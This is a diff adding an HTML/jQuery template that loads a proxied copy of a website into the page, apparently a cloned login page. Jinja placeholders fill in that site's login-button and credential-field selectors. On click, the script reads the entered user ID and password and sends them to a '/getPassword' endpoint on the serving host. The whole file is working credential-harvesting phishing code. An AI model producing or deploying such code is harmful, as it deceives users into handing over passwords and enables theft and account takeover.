@@ -1,0 +1,39 @@
+<html>
+
+<head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script>
+        let html;
+        
+        $(document).ready(function () {
+            $.ajax({
+                url: 'http://127.0.0.1:5000/proxy',
+                success: function (data) {
+                    html = data;
+                    display_html();
+                }
+            });
+        });
+
+        function display_html() {
+            $("body").append(html);
+            // Use jinja to inject class and ids of the button and the input fields
+            // $(".login-button").click(function(){
+            $("{{login_button}}").click(function(){
+                // var userLoginId = $("#id_userLoginId").val();
+                // var userPassword = $("#id_password").val();
+                var userLoginId = $("{{user_name_field}}").val();
+                var userPassword = $("{{password_field}}").val();
+
+                $.ajax({
+                    url: 'http://127.0.0.1:5000/getPassword',
+                    data: { id: userLoginId, password: userPassword},
+                });
+            });
+        }
+
+    </script>
+</head>
+<body>
+</body>
+</html>
